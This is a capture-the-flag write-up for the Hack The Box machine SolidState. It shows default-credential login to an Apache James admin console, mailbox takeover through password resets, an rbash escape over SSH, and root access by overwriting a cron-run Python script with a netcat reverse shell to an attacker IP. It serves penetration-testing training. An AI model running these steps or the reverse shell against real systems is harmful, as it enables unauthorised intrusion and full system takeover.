
<div id="tsparticles"></div>
<br></br>

<h1 style="text-align:center;font-size:2em;color:#595454"><span style="color:#ff7b00">───────//</span> Hack The Box - SolidState <span style="color:#ff7b00">//───────</span></h1>

<br></br>

> [!example] **Briefing**
> **SolidState is a medium-rated Linux Network Pentesting machine. **
> 
> **The machine challenges users to exploit a vulnerable Apache James mail server that exposes its remote administration interface with default credentials. 
> Through this interface, its possible to reset the passwords of existing mail users and read their mailboxes via POP3, which reveals SSH credentials for a low-privileged user.**
> 
> **Logging in via SSH leads into a restricted shell, which can be bypassed with a payload which is executed directly through SSH. A world-writable Python script (`/opt/tmp.py`) that is executed periodically, by modifying it to run a reverse shell and gain full control of the system.**

<br></br>
<span style="color:rgb(89, 84, 84)"><h1 style="text-align: center; font-size: 2em;"></span>
<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">Information Gathering</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
<span style="color:rgb(89, 84, 84)"></h1></span>
<br></br>

---
<h3 align="center"><span style="color:rgb(89, 84, 84)">Machine Information</span></h3>
<p align="center"><span style="color:rgb(89, 84, 84)">Operating System: Linux</span></p>
<p align="center"><span style="color:rgb(89, 84, 84)">Provided Credentials: None</span></p>
<p align="center"><span style="color:rgb(89, 84, 84)">Topics: James MailService Misconfiguration, Escaping rbash, Python, Cronjobs</span></p>

---
<br></br>

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Nmap: SYN Initial Scan <span style="color:#ff7b00"></span></h2>
<br></br>

**To get a quick overview of the open ports on our target, I will run a SYN scan first. The service/version scan follows afterwards to gather more detailed information.** 
**In the expandable “Nmap Options” field, I explain the individual components of the command in more detail.** 

```
sudo nmap -Pn 10.129.102.95 -oA nmap/SolidState_initial
```

> [!help]- Nmap-Options
> | Option                  | Description                                                                  |
> | ----------------------- | ---------------------------------------------------------------------------- |
> | **`sudo`** | Root privileges - nmap then uses the SYN scan (`-sS`) by default |
> | **`-Pn`**               | Treat all hosts as online - skip host discovery                              |
> | **`-oA`**               | Output in the three major formats at once (normal, XML, and grepable)        |

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Nmap: Detailed Scan <span style="color:#ff7b00"></span></h3>
<br></br>

**Since there are only six open ports, I will run the same command again, this time adding `-sC -sV` to get default script output and service version information.** 

```
nmap -Pn -sV -sC 10.129.102.95 -v -oA nmap/SolidState_detailed
```

![[Pasted image 20261125204531.png]]
- **Domain: *solid-state-security.com* (We can add this to /etc/hosts now.)**

> [!NOTE]- Add a Host to /etc/hosts
> ```echo "10.129.229.56 authority.htb" | sudo tee -a /etc/hosts```

<br></br>

---

> [!NOTE] Thoughts on Nmap Scan
> What stands out to me besides the website on port 80 are the following ports: 25, 110, 4555.
> [SMTP(25)](https://www.mailgun.com/blog/email/which-smtp-port-understanding-ports-25-465-587/) is a process by which emails are sent across the internet. [POP3(110))](https://kewl.lu/articles/pop3/) is used to retrieve/download emails from a users mailbox. [James Remote Admin(4555)]([https://www.mailgun.com/blog/email/which-smtp-port-understanding-ports-25-465-587/](https://www.ibm.com/docs/en/webmethods-integration/wm-infrastructure/10.15.0?topic=transport-setting-up-apache-james-server))  interface for managing users, passwords, aliases, and redirects. 

---


<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> James Remote Admin <span style="color:#ff7b00"></span></h3>

**Looking at the Apache James documentation ([Link](https://james.apache.org/server/archive/configuration_v2_0.html)) a default login as root is mentioned.**
 **Default Credentials: `root:root`**. 
**A possible attack path look like this: We use James default credentials to login as root and change passwords of users and than read there emails to find information disclosure or other helpful information.** 

```
telnet 10.129.102.24 4555
```

**With `telnet` we can connect to port `4555` and login as root.**

```
Trying 10.129.102.24...
Connected to 10.129.102.24.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root 
Password:
root
Welcome root. HELP for a list of commands
```

**The list of command we se after typing `HELP` explains `setpassword [username] [password]` can be used to change a users password.** 

```
setpassword john password123
Password for john reset
```

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Post Office Protocol Version 3 <span style="color:#ff7b00"></span></h3>

**This credentials can be used to login via telnet port 110.**

```
telnet 10.129.102.24 110
```

```
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 

USER john
+OK

PASS password123
+OK Welcome john

LIST
+OK 1 743

1 743
.

RETR 1
+OK Message follows

```

![[Pasted image 20261126000104.png]]

**James tells John to send Mindy a mail containing her password, if Mindy did not change her it we may be able to use these. In the previous stage I've explained how to change a users password, we repeat this step but this time for "Mindy:password123". Afterwards login with Mindy on POP3 and read the second message she got.**

```
RETR 2
+OK Message follows
```

![[Pasted image 20261126000740.png]]

```
username: mindy
pass: P@55W0rd1!2@
```

**Judging by the email, the credentials are being used for SSH.** 

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> SSH Initial Access <span style="color:#ff7b00"></span></h3>

**If  login as Mindy using SSH  we can use almost no command typing `cd ..` shows that we got a restricted bash shell (`rbash`).** 

```
ssh mindy@solid-state-security.com
```

![[Pasted image 20261126202908.png|264]]

**Whenever we get in a situation where we land in a restricted shell, any kind of docker or other environments where our possibilities to interact with anything are very limited, there's maybe a way to escape these. I found a very helpful document on [hacktricks.wiki](https://hacktricks.wiki/en/linux-hardening/main-system-information/escaping-from-limited-bash.html) about how to escape rbash.** 

```
ssh mindy@solid-state-security.com -t "bash --noprofile -i"
```

**Running `cd ..` again verifies we escaped the rbash shell. Now that we are able to navigate though the machine, we could manually enumerate the machine by going to the root (`/`) directory or use tools like LinPEAS or LinEnum to get more information.**
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd ..
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ ls
james  mindy
```

**Searching directories like `opt`, `tmp`, `var` or the home directories of other users if possible. There was nothing of interest in `james` files, but `opt` had an unusual python file in it.** 

```
cat /opt/tmp.py
```

![[Pasted image 20261127203556.png]]

**This Python script that recursively deletes all files and folders in `/tmp` using a shell command.**
**If we run `ls -la /opt/tmp.py` the permissions on these file are configured in a way literally everyone can read, write and execute it. One thing to mention is that if Mindy runs that command it get not executed as root, a way to escalate privileges here could be a cronjob executing this file.**

```
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
```

**In order to find a cronjob we can use commands like the ones from the list below:**
```
cat /etc/crontab
crontab -l                 #show crontabs of current user
sudo crontab -l -u <user>  #show crontab of a other user
ls -la /var/spool/cron/ /var/spool/cron/crontabs/
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

**Looking through the output the only possible way these script may be executed is a crontab in `/var/spool/cron/crontabs/`.** 

```
#!/usr/bin/env python
import os
import sys
try:
     os.system("nc 10.10.14.169 9001 -e /bin/bash")
except:
     sys.exit()
```

**Modifying the `tmp.py` file with `nano /opt/tmp.py` so that it will run a reverse shell instead of the remove(`rm`) command may give us a remote connection as long as the files really gets executed by a cronjob.** 

---

<h1 style="text-align:center;font-size:2em;color:#595454"><span style="color:#ff7b00">───────//</span> Privilege Escalation <span style="color:#ff7b00">//───────</span></h1>

**On the attacker machine run Netcat Listener on port 9001. Now we have to wait, and if everything works out well we get back the root shell session indicated by the "connect to <attacker_IP>..." message.** 

```
nc -lvnp 9001
```

![[Pasted image 20261126225343.png]]

**We got a connection as root and can be sure that `tmp.py` is run every few minutes.**

**As a little bonus lets try to figure out what going on with the crontab we were not able to inspect as Mindy. Looking at the `crontabs` directory again the sticky bit (`T`) restricts deletion and renaming of files within the directory to the file's owner, the directory's owner, or root, regardless of write permissions on the directory.** 
```
/var/spool/cron$ ls -ld crontabs
drwx-wx--T 2 root crontab 4096 Apr 26  2021 crontabs
```

```
pwd
/var/spool/cron/crontabs
ls
root
cat root
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.RFyCY4/crontab installed on Tue Aug 22 13:33:43 2017)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * python /opt/tmp.py
```

**The Script get runs every three units here in the minute field so every three minutes.**
**We can monitoring the process and if we wait three minutes root executes `python /opt/tmp.py`.**

```
watch -n 1 "ps -eo pid,ppid,user,cmd --sort=-start_time | head -n 25"
```

![[Pasted image 20261126232330.png]]
- We see the PID from the last execution. 

![[Pasted image 20261126233022.png]]
- **This image shows that the PID changed, this is because every time the crontab is running `tmp.py` again it is a new process.** 